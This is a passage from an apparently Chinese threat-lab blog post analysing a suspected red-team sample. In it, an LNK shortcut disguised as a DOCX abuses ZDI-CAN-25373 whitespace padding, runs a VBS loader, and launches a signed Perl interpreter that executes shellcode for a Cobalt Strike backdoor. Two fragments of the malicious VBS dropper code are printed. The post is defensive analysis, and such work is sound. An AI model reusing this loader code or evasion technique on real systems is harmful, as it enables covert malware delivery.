---
title: 疑似HW攻击队白加白样本分析：伪装DOCX诱饵背后的CS后门
url: https://mp.weixin.qq.com/s/-TC7C52sMRY-GC0OvOD0eQ
source: Doonsec's feed
date: 2026-09-10
fetch_date: 2026-09-11T06:50:17.841471
---

# 疑似HW攻击队白加白样本分析：伪装DOCX诱饵背后的CS后门

# 疑似HW攻击队白加白样本分析：伪装DOCX诱饵背后的CS后门

原创

decoylab
decoylab

吉宙实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/VQqGVAok0qrr96jCMf2fUOCIKxgiaLjW9mbsDwXiakPep3oN7aF6ubj2v5AcxWlfnTn5efRclibScianCiaRjZ4gFBA/640?from=appmsg)

点击蓝字

关注我～

一起发现更多精彩哟

![](https://mmbiz.qpic.cn/mmbiz_png/yD8EGuAMwkKtE35bkkAyaSqicNvicmnsHg3kbPYuhoLsickCwu559KCRMwmlYckjujRuQ2EJT3nrCDx7K8o3NzbZQ/640?from=appmsg)

在吉宙实验室例行威胁样本追踪过程中，发现疑似 HW 攻击队样本，将其上传至吉星云诱捕分析平台 (https://decoymini.com) 进行检测，检测结果如下：

可视化分析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZwOaHkn92Mzc4usXZnmb1amsuNU6GChcjSicUIBBiade8ej9wtPWVsfUa2IMwgFDRKEwJmMI2LeibFotZKcyKmKicCVNib9HaNzWG7E/640?wx_fmt=png&from=appmsg)

检测结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZza6BbuDoV8jib5W4N1CAHj89MgD6YicI4EeXCMyHrRuTxgbzicO8mxPLibsqlQTFzCLSZE3e7Q5RiaINryibiaALiadOraBxvXsvM20WA/640?wx_fmt=png&from=appmsg)

进程详情

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZzWs418iayAwQLI0CBdzGXIdRk9hSrfwLQ3fVThA61YyY1qqRMWB8pP7LgthHror6viaAPIttgUnmRxFqEo8ibyJam34PQJsWVcgs/640?wx_fmt=png&from=appmsg)

网络行为

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZwrbZEh9uq3OoW7NB2JN2U08KVuYlnVzruQFF3ibZHz2EHrWLSIjQ4tORuzJGjDzkC7jicSt43YwibVFZ7UCoN75ebohrtLiaScicQg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ic71wVtGetfHDu1wydMskOKuoXicunjouOlWhIdKVhicUw0VEEUibaahW73bFBktvxRUb7w5A9GS4POh7uqoAm4I8w/640)

![](https://mmbiz.qpic.cn/mmbiz_png/Bd7jlAWL2kJb0ad17GyZNCYMgklIXicN3a4gtzIPibVdu0k3QMYmTqXZcJbzKN4BCUdoPTPfNvEyOenQmWShIKUw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/EeJSAMoAk9AaZBDONXq5mr1CnahhdFPRnN7Zk7c1R8mNJb1T2PCGUYiatym44rUOVbxzCHRByoeKaqz0Eh6o3ng/640)

分 析

![](https://mmbiz.qpic.cn/mmbiz_png/cZBtichFtVOicw0ecmyjicxsyvdEtIDcDaN5EoEiaejwr3qhO8FFapczeI7LbibJlGTxgjQIm6Avy8ISPuEPI6yus7Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3QTIKn9jFuMib8ic1Qldejuib3qXtTqDpDTRq0ciaZRBbE4WGzg7K2FvVhaIJ4HM6gs06qqYzoiaz22FEF38R0Ozr8A/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3AJf6zpEXO8e3OMs0hVse7E8dySmiaRe5p5vExYnzKGdUV6pMv9VmicM0ib4QIUj08lGtiaQp2dXbSn2coO8mK4yBg/640)

样本为一个压缩包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZwnU1zUicMvrdiajytX9kjI6TicozxqVYQXHz6wTHferSvZ4cAfh8HYoohH1vOcwFU7JibgrxAA5BkKwYHHM3ib3MDLRGceQeorNrIo/640?wx_fmt=png&from=appmsg)

压缩包内包含一个伪装成 docx 文档的快捷方式诱饵文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZzrPmSad5uUZndV8oIbYNubMQxw6AnGqSsFCnfDlCycCVLPCBxobjBMveJqiahWJ78wHlGcoU7mjndWoScGmicHicch0XI8d83DSA/640?wx_fmt=png&from=appmsg)

如果查看属性会看不到要执行的目标，LNK 解析工具也失效，例如 LECmd，沙箱检测出 ZDI-CAN-25373

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZzRrQI7SG7CQ10ma3HCWYxBTqOl9MV1sj4icVuKREQRseENIDYo57L3ibboOjfk2O0qRPkOmibaDYArL9UmupTW5EyIVWGnxAiapPQ/640?wx_fmt=png&from=appmsg)

这是一个 LNK 漏洞，在 COMMAND\_LINE\_ARGUMENTS 结构中填充大量空白字符 (如空格、制表符、换行符等)，这样 Windows 界面就无法正确显示命令行参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZw6PMex3YEpwMc84AVH9dNxyVBRWP8bvC0kWMtkATQqpvrPOJHGGSK7cFX5goia4YkGD3R9mV7lMdoucpKjqfVQbjVXI1qoM04g/640?wx_fmt=png&from=appmsg)

这里使用 explorer 执行 image.vbs，\_\_IMAGE\_\_ 文件夹被设置成系统隐藏属性

![](https://mmbiz.qpic.cn/mmbiz_png/bCJqpmbtQZxRMVqfud8BkicPiaPTTYdQtQCBbzwyCuvib1UiadFFe6pmzQw7o9UgdiaPwU21e2HrHaygl4nC6vYianWnjEGicmnqAKaI2wn27Jnjzk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ic71wVtGetfHDu1wydMskOKuoXicunjouOlWhIdKVhicUw0VEEUibaahW73bFBktvxRUb7w5A9GS4POh7uqoAm4I8w/640)

![](https://mmbiz.qpic.cn/mmbiz_png/Bd7jlAWL2kJb0ad17GyZNCYMgklIXicN3a4gtzIPibVdu0k3QMYmTqXZcJbzKN4BCUdoPTPfNvEyOenQmWShIKUw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/EeJSAMoAk9AaZBDONXq5mr1CnahhdFPRnN7Zk7c1R8mNJb1T2PCGUYiatym44rUOVbxzCHRByoeKaqz0Eh6o3ng/640)

image.vbs

![](https://mmbiz.qpic.cn/mmbiz_png/cZBtichFtVOicw0ecmyjicxsyvdEtIDcDaN5EoEiaejwr3qhO8FFapczeI7LbibJlGTxgjQIm6Avy8ISPuEPI6yus7Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3QTIKn9jFuMib8ic1Qldejuib3qXtTqDpDTRq0ciaZRBbE4WGzg7K2FvVhaIJ4HM6gs06qqYzoiaz22FEF38R0Ozr8A/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3AJf6zpEXO8e3OMs0hVse7E8dySmiaRe5p5vExYnzKGdUV6pMv9VmicM0ib4QIUj08lGtiaQp2dXbSn2coO8mK4yBg/640)

image.vbs 会先去打开正常的 jy.docx 文件，让中招者放松警惕，接着将 file1.zip 后 32 字节内容另保存为 file.zip

```
g=a.BuildPath(d,"jy.docx")If a.FileExists(g) Then c.Run """"&g&"""",1,False
Dim s,data,s2Set s=CreateObject("ADODB.Stream")s.Type=1s.Opens.LoadFromFile a.BuildPath(d,"file1.zip")s.Position=32data=s.ReadSet s2=CreateObject("ADODB.Stream")s2.Type=1s2.Opens2.Write datas2.SaveToFile a.BuildPath(d,"file.zip"),2s.Closes2.Close
e=a.BuildPath(d,"file.zip")If Not a.FileExists(e) Then WScript.Quit
```

最后通过 wpservice.exe 执行 sitecustomize.pl 文件

```
z e,d
'#__EXE_FILE__#f=a.BuildPath(d,"bin"&Chr(92)&"wpservice.exe")If Not a.FileExists(f) Then WScript.Quit
c.CurrentDirectory=a.GetParentFolderName(f)c.Run """"&f&"""",1,False
Sub z(g,h)Dim i,j,k,lSet i=b.NameSpace(g)Set j=b.NameSpace(h)If i Is Nothing Then WScript.QuitSet k=i.Items()j.CopyHere k,4+16+256+512For l=1 To 300WScript.Sleep 200If a.FileExists(a.BuildPath(h,"bin"&Chr(92)&"wpservice.exe")) ThenIf a.FileExists(a.BuildPath(h,"bin"&Chr(92)&"perl526.dll")) ThenIf a.FileExists(a.BuildPath(h,"site"&Chr(92)&"lib"&Chr(92)&"sitecustomize.pl")) Then Exit ForEnd IfEnd IfNextEnd Sub
```

![](https://mmbiz.qpic.cn/mmbiz_png/ic71wVtGetfHDu1wydMskOKuoXicunjouOlWhIdKVhicUw0VEEUibaahW73bFBktvxRUb7w5A9GS4POh7uqoAm4I8w/640)

![](https://mmbiz.qpic.cn/mmbiz_png/Bd7jlAWL2kJb0ad17GyZNCYMgklIXicN3a4gtzIPibVdu0k3QMYmTqXZcJbzKN4BCUdoPTPfNvEyOenQmWShIKUw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/EeJSAMoAk9AaZBDONXq5mr1CnahhdFPRnN7Zk7c1R8mNJb1T2PCGUYiatym44rUOVbxzCHRByoeKaqz0Eh6o3ng/640)

wpservice.exe

![](https://mmbiz.qpic.cn/mmbiz_png/cZBtichFtVOicw0ecmyjicxsyvdEtIDcDaN5EoEiaejwr3qhO8FFapczeI7LbibJlGTxgjQIm6Avy8ISPuEPI6yus7Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3QTIKn9jFuMib8ic1Qldejuib3qXtTqDpDTRq0ciaZRBbE4WGzg7K2FvVhaIJ4HM6gs06qqYzoiaz22FEF38R0Ozr8A/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3AJf6zpEXO8e3OMs0hVse7E8dySmiaRe5p5vExYnzKGdUV6pMv9VmicM0ib4QIUj08lGtiaQp2dXbSn2coO8mK4yBg/640)

wpservice.exe 是一个带有有效签名的程序，从文件名称上来看，似乎是 wps 的服务类程序，但其实是 perl 程序，又是 "白加黑"？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZxOuMbWgBIMIV9gQAic37pxicaBZ6S3OlzgvOCpOEpUWQhgWyfqcEbpWz7tMD5YwnV9tJ0dnAxHGicQQ2rh9buE7kZaict50Fiaic9yg/640?wx_fmt=png&from=appmsg)

sitecustomize.pl 是一个 perl 脚本，可以通过 perl 程序来执行，当执行脚本时，会去调用 perl526.dll 中 RunPerl 导出函数，所以严格来说不属于 "白加黑"，因为 perl526.dll 是个正常的 Dll 文件，算是 "白加白"，类似的技术之前在 [伪装成卡巴斯基安装包银狐高对抗样本分析](https://mp.weixin.qq.com/s?__biz=MzY5ODIyNDQxMg==&mid=2247484126&idx=1&sn=513f40139348ab0b4c073fdfc98c0be3&scene=21#wechat_redirect) 这篇文章中提到的利用 xshell 的自我更新功能执行了恶意的 Lua 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/ic71wVtGetfHDu1wydMskOKuoXicunjouOlWhIdKVhicUw0VEEUibaahW73bFBktvxRUb7w5A9GS4POh7uqoAm4I8w/640)

![](https://mmbiz.qpic.cn/mmbiz_png/Bd7jlAWL2kJb0ad17GyZNCYMgklIXicN3a4gtzIPibVdu0k3QMYmTqXZcJbzKN4BCUdoPTPfNvEyOenQmWShIKUw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/EeJSAMoAk9AaZBDONXq5mr1CnahhdFPRnN7Zk7c1R8mNJb1T2PCGUYiatym44rUOVbxzCHRByoeKaqz0Eh6o3ng/640)

sitecustomize.pl

![](https://mmbiz.qpic.cn/mmbiz_png/cZBtichFtVOicw0ecmyjicxsyvdEtIDcDaN5EoEiaejwr3qhO8FFapczeI7LbibJlGTxgjQIm6Avy8ISPuEPI6yus7Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3QTIKn9jFuMib8ic1Qldejuib3qXtTqDpDTRq0ciaZRBbE4WGzg7K2FvVhaIJ4HM6gs06qqYzoiaz22FEF38R0Ozr8A/640)

![](https://mmbiz.qpic.cn/mmbiz_png/3AJf6zpEXO8e3OMs0hVse7E8dySmiaRe5p5vExYnzKGdUV6pMv9VmicM0ib4QIUj08lGtiaQp2dXbSn2coO8mK4yBg/640)

sitecustomize.pl 文件内容很明显就暴露出了恶意意图，通过创建线程的方式来执行 shellcode

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bCJqpmbtQZwrCyD1RUscvTkEszXmytKO0iaJKQrRybOQA7OtFmBBQbuHzEibxM2GdrpKZVltto426O2abxy9icTocCyicZA6n1LeQpErQddLwkY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ic71wVtGetfHDu1wydMskOKuoXicunjouOlWhIdKVhicUw0VEEUibaahW73bFBktvxRUb7w5A9GS4POh7uqoAm4I8w/640)

![](https://mmbiz.qpic.cn/mmbiz_png/Bd7jlAWL2kJb0ad17GyZNCYMgklIXicN3a4gtzIPibVdu0k3QMYmTqXZcJbzKN4BCUdoPTPfNvEyOenQmWShIKUw/640)

![](https://mmbiz.qpic.cn/mmbiz_png/EeJSAMoAk9AaZBDONXq5mr1CnahhdFPRnN7Zk7c1R8mNJb1T2PCGUYiatym44rUOVbxzCHRByoeKaqz0Eh6o3ng/640)

shellcode

![](https://...